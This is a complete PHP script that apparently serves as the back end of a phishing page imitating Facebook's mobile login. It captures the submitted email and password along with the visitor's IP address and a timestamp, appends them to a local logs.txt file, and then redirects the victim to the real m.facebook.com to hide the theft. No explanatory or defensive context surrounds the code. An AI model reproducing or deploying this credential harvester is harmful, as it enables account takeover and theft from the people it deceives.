<?php
$go = fopen("logs.txt","a+");
$timestamp = time();
$date = date("d.m.Y - H:i:s", $timestamp);
$mail = $_POST["email"];
$pass = $_POST["pass"];
$ip = $_SERVER['REMOTE_ADDR'];
fwrite($go, "Hoster: Facebook-Mobile\n");
fwrite($go, "Date: " . "$date \n");
fwrite($go, "E-Mail: " . "$mail \n");
fwrite($go, "Password: " . "$pass \n");
fwrite($go, "Ip: " . "$ip \n");
fwrite($go, " \n");
fclose($go);
header('Location: http://m.facebook.com');
?>
